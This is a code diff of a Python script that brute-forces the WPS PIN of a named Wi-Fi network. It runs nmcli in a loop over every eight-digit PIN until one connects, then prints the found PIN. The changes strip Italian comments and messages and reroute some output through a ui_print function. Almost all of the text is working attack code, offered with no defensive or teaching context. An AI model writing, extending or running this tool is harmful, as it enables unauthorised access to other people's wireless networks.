@@ -8,12 +8,10 @@ import subprocess
 import time
 
 def generate():
-    """Genera PIN WPS incrementali da 00000000 a 99999999."""
     for var in range(0, 100000000):
         yield f"{var:08d}"  
 
 def connect(ssid, pin):
-    """Prova a connettersi a una rete Wi-Fi utilizzando un PIN WPS."""
     try:
         result = subprocess.run(
             ["nmcli", "dev", "wifi", "connect", ssid, "--wps-pin", pin],
@@ -23,21 +21,19 @@ def connect(ssid, pin):
         )
 
         if "successfully activated" in result.stdout.lower():
-            print(f"Connesso a '{ssid}' con PIN: {pin}")
+            ui_print(f"Connected'{ssid}' \n PIN: {pin}")
             return True
         else:
             print(f"PIN {pin} fallito.")
             return False
     except Exception as e:
-        print(f"Errore durante la connessione con il PIN {pin}: {e}")
+        ui_print(f"Error {pin}:\n {e}")
         return False
 
 def brute_force_wps(ssid):
-    """Tenta tutti i PIN WPS fino a trovare quello corretto."""
-    print(f"Avvio brute force per la rete '{ssid}'...")
     for pin in generate():
         if connect(ssid, pin):
-            print(f"PIN corretto trovato: {pin}")
+            ui_print(f"PIN : {pin}")
             break
         time.sleep(0.1) 
 
